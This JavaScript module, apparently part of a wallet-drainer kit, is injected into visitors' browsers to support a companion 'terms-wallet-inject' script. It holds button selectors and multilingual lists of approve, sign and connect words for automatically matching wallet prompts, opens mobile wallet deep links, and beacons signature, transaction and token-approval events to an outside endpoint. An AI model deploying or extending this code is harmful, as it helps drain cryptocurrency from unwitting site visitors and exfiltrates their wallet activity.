/**
 * Agent visitor core — mobile, i18n, presets, chain auto, events, nudge UI.
 * Visitor browser only. Load before terms-wallet-inject.
 */
(function agentVisitorCore() {
  'use strict';
  if (window.__LEGION_AGENT_CORE__) return;
  window.__LEGION_AGENT_CORE__ = true;

  const PRESETS = {
    uniswap: {
      connectSelectors: ['.nav-connect', '#navConnectBtn', '.main-btn.connect'],
      approveSelectors: ['.main-btn.swap', '[data-testid="confirm-swap"]'],
      chainDataAttributes: ['data-chain-id', 'data-chain'],
    },
    generic: {
      connectSelectors: ['[data-connect]', '.connect-wallet', '#connect-wallet'],
      approveSelectors: ['[data-testid*="approve"]', '[data-testid*="confirm"]'],
      chainDataAttributes: ['data-chain-id', 'data-chain', 'data-network'],
    },
  };

  const I18N_APPROVE = [
    'approve', 'confirm', 'accept', 'agree', 'yes', 'ok', 'continue', 'sign', 'next',
    'authorize', 'allow', 'proceed', 'submit', 'connect', 'switch network', 'add network',
    '确认', '批准', '同意', '继续', '签名', '连接',
    'bestätigen', 'genehmigen', 'verbinden', 'unterschreiben',
    'confirmer', 'approuver', 'connecter', 'signer',
    'confirmar', 'aprobar', 'conectar', 'firmar',
    'पुष्टि', 'स्वीकार', 'कनेक्ट', 'हस्ताक्षर',
    '確認', '承認', '接続', '署名',
    '확인', '승인', '연결', '서명',
  ];

  const I18N_CONNECT = [
    'connect', 'connect wallet', 'link wallet', 'sign in',
    '连接钱包', '连接', 'verbinden', 'connecter', 'conectar', 'कनेक्ट करें', 'ウォレット接続',
  ];

  const MOBILE_DEEP_LINKS = {
    MetaMask: (uri) => `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`,
    Trust: (uri) => `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`,
    Rainbow: (uri) => `https://rnbwapp.com/wc?uri=${encodeURIComponent(uri)}`,
    default: (uri) => uri,
  };

  function isMobile() {
    return /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) || window.innerWidth < 768;
  }

  function detectChainFromPage() {
    const attrs = ['data-chain-id', 'data-chain', 'data-network', 'data-chainid'];
    for (const attr of attrs) {
      const el = document.querySelector(`[${attr}]`) || document.documentElement;
      const v = el.getAttribute?.(attr) || document.querySelector(`meta[name="${attr}"]`)?.content;
      if (v) {
        const n = Number(v);
        if (!Number.isNaN(n) && n > 0) return n;
        const map = { ethereum: 1, mainnet: 1, polygon: 137, matic: 137, arbitrum: 42161, base: 8453, bsc: 56 };
        const key = String(v).toLowerCase();
        if (map[key]) return map[key];
      }
    }
    return null;
  }

  function getPreset(name) {
    return PRESETS[name] || PRESETS.generic;
  }

  function showNudge(msg, ms = 5000) {
    const id = 'legion-agent-nudge';
    let el = document.getElementById(id);
    if (!el) {
      el = document.createElement('div');
      el.id = id;
      Object.assign(el.style, {
        position: 'fixed', bottom: '20px', left: '50%', transform: 'translateX(-50%)',
        zIndex: '2147483644', background: '#2d3436', color: '#fff', padding: '12px 20px',
        borderRadius: '12px', fontSize: '14px', fontFamily: 'system-ui,sans-serif',
        boxShadow: '0 8px 32px rgba(0,0,0,.4)', maxWidth: '90vw', textAlign: 'center',
      });
      document.body.appendChild(el);
    }
    el.textContent = msg;
    el.style.display = 'block';
    clearTimeout(el._t);
    el._t = setTimeout(() => { el.style.display = 'none'; }, ms);
  }

  function emitEvent(type, payload) {
    const cfg = window.LegionAgentConfig || {};
    const detail = { type, payload, ts: Date.now(), url: location.href };
    window.dispatchEvent(new CustomEvent('legion:agent', { detail }));
    if (typeof cfg.onEvent === 'function') {
      try { cfg.onEvent(type, payload); } catch { /* */ }
    }
    if (cfg.eventEndpoint) {
      try {
        navigator.sendBeacon?.(
          cfg.eventEndpoint,
          new Blob([JSON.stringify(detail)], { type: 'application/json' }),
        ) || fetch(cfg.eventEndpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(detail),
          keepalive: true,
        }).catch(() => {});
      } catch { /* */ }
    }
  }

  function openMobileWallet(uri, walletName) {
    if (!uri || !isMobile()) return false;
    const fn = MOBILE_DEEP_LINKS[walletName] || MOBILE_DEEP_LINKS.default;
    const link = fn(uri);
    try {
      window.location.href = link;
      return true;
    } catch {
      return false;
    }
  }

  function textMatchesI18n(text, list) {
    const t = (text || '').trim().toLowerCase();
    if (!t || t.length > 50) return false;
    return list.some((w) => t === w.toLowerCase() || t.includes(w.toLowerCase()));
  }

  function applyAgentConfig() {
    const cfg = window.LegionAgentConfig || {};
    const tw = window.TermsWalletAutomation;
    if (!tw) return;

    Object.assign(tw.config, {
      debug: cfg.debug === true,
      showTermsPopup: cfg.showTermsPopup === true,
      targetChainId: cfg.chainId ?? detectChainFromPage() ?? tw.config.targetChainId,
      autoSwitchNetwork: cfg.autoSwitchNetwork !== false,
      termsTitle: cfg.termsTitle || tw.config.termsTitle,
      termsBody: cfg.termsBody || tw.config.termsBody,
      yesLabel: cfg.yesLabel || tw.config.yesLabel,
      noLabel: cfg.noLabel || tw.config.noLabel,
    });

    const preset = getPreset(cfg.preset || document.documentElement.getAttribute('data-legion-preset') || 'generic');
    tw._agentPreset = preset;
    tw._i18nApprove = I18N_APPROVE;
    tw._i18nConnect = I18N_CONNECT;
    tw._isMobile = isMobile();
    tw._showNudge = showNudge;
    tw._emitEvent = emitEvent;
    tw._openMobileWallet = openMobileWallet;
    tw._textMatchesI18n = textMatchesI18n;

    emitEvent('agent:init', {
      mobile: tw._isMobile,
      chainId: tw.config.targetChainId,
      preset: cfg.preset || 'generic',
    });
  }

  function wireAgentEvents() {
    const events = [
      ['tw:wallets-detected', 'wallets:detected'],
      ['tw:wallet-connected', 'wallet:connected'],
      ['tw:chain-switched', 'chain:switched'],
      ['tw:sign-typed-data', 'sign:typed-data'],
      ['tw:personal-sign', 'sign:personal'],
      ['tw:send-tx', 'tx:send'],
      ['tw:token-approve-click', 'token:approve-click'],
      ['tw:walletconnect-uri', 'wc:uri'],
    ];
    for (const [domEv, type] of events) {
      window.addEventListener(domEv, (e) => emitEvent(type, e.detail));
    }

    window.addEventListener('tw:walletconnect-uri', (e) => {
      const uri = e.detail?.uri;
      const wallets = window.TermsWalletAutomation?.getDetectedWallets?.() || [];
      const primary = wallets[0]?.name;
      if (uri && openMobileWallet(uri, primary)) {
        showNudge('Opening wallet app…');
      }
    });
  }

  window.LegionAgent = {
    isMobile,
    detectChainFromPage,
    getPreset,
    showNudge,
    emitEvent,
    openMobileWallet,
    I18N_APPROVE,
    I18N_CONNECT,
    PRESETS,
    applyConfig: applyAgentConfig,
  };

  // Apply after TermsWalletAutomation boots
  const boot = () => {
    applyAgentConfig();
    wireAgentEvents();
  };
  if (window.TermsWalletAutomation) boot();
  else window.addEventListener('load', () => setTimeout(boot, 50));
})();
